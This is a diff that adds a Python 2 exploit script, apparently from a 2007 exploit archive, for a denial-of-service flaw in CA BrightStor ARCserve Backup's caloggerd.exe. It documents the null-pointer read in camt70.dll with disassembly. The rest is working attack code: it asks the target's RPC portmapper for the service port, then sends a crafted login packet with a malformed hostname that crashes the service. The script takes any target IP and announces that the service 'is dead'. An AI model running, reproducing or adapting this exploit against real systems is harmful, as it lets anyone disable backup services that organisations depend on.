@@ -1,0 +1,112 @@
+#!/usr/bin/python
+#
+# Computer Associates (CA) Brightstor Backup caloggderd.exe DoS (camt70.dll)
+# (Previously Unknown)
+# 
+# There is an issue in camt70.dll when caloggerd is processing a hostname for a login operation.
+# When processing the string, if a null is passed in as an argument, it will be loaded into ESI
+# and then loaded into EDI in which the string processing will read a null memory location.
+# 
+# .text:0032ADD0 push    ecx
+# .text:0032ADD1 mov     eax, [esp+4+arg_4]
+# .text:0032ADD5 push    esi
+# .text:0032ADD6 mov     esi, [esp+8+arg_8] <--null gets loaded
+# .text:0032ADDA push    edi
+# .text:0032ADDB mov     edx, [eax]
+# .text:0032ADDD mov     edi, esi	    <-- EDI gets set to nulls
+# .text:0032ADDF or      ecx, 0FFFFFFFFh
+# .text:0032ADE2 xor     eax, eax
+# .text:0032ADE4 repne scasb
+#
+# This was tested on BrightStor ARCserve Backup 11.5.2.0 (SP2) with the latest 
+# CA patches on Windows XP SP2 
+#
+# CA has been notified
+#
+# Author: M. Shirk 
+#
+# (c) Copyright 2007 (Shirkdog Security) shirkdog_list $ at % hotmail dot com 
+#
+# Use at your own Risk: You have been warned 
+#------------------------------------------------------------------------
+
+import os
+import sys
+import time
+import socket
+import struct
+
+#------------------------------------------------------------------------
+
+# RPC GetPort request for caloggerd
+rpc_portmap_req="\x80\x00\x00\x38\x21\x84\xf7\xc9\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x09\x82\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00"
+
+
+# Begining of RPC Packet
+packet="\x80\x00\x00\x58\x31\x46\xD3\xB9\x00\x00\x00\x00\x00\x00\x00\x02"
+
+# Prog ID (caloggerd)
+packet+="\x00\x06\x09\x82"
+
+# Operation number 1
+packet+="\x00\x00\x00\x01\x00\x00\x00\x01"
+
+# Nulls
+packet+="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+# Size of hostname, used in the Login
+packet+="\x00\x00\x00\x22" 
+
+# Hostname, which apparently with the size and the nulls, causes the DoS
+packet+="\x41\x41\x41\x41"*8
+packet+="\x41\x41\x00\x00"
+packet+="\xff\xff\xff\xff"
+
+#------------------------------------------------------------------------
+
+def GetCALoggerPort(target):
+	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	sock.connect((target,111))
+	sock.send(rpc_portmap_req)
+	rec = sock.recv(256)
+	sock.close()
+
+	port1 = rec[-4]
+	port2 = rec[-3]
+	port3 = rec[-2]
+	port4 = rec[-1]	
+	
+	port1 = hex(ord(port1))
+	port2 = hex(ord(port2))
+	port3 = hex(ord(port3))
+	port4 = hex(ord(port4))
+	port = '%02x%02x%02x%02x' % (int(port1,16),int(port2,16),int(port3,16),int(port4,16))
+	port = int(port,16)
+
+	print '[+] Sending TCP Packet of Death to Target: %s Port: %s' % (target,port)
+	ExploitCALoggerd(target,port)
+
+
+def ExploitCALoggerd(target,port):
+	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	sock.connect((target,port))
+	sock.send(packet)
+	sock.close()
+	print '[+] Done...\n[+] caloggerd.exe is dead\n[+] ... or it will die in a few seconds for you inpatient bastards\n'
+
+
+if __name__=="__main__":
+       try:
+               target = sys.argv[1]
+       except IndexError:
+		print '[+] Computer Associates (CA) Brightstor Backup caloggerd.exe DoS (camt70.dll)'
+       		print '[+] Author: Shirkdog'
+               	print '[+] Usage: %s <target ip>\n' % sys.argv[0]
+               	sys.exit(-1)
+
+       print '[+] Computer Associates (CA) Brightstor Backup caloggerd.exe DoS (camt70.dll)'
+       print '[+] Author: Shirkdog'
+
+       GetCALoggerPort(target)
+
+# milw0rm.com [2007-05-16]
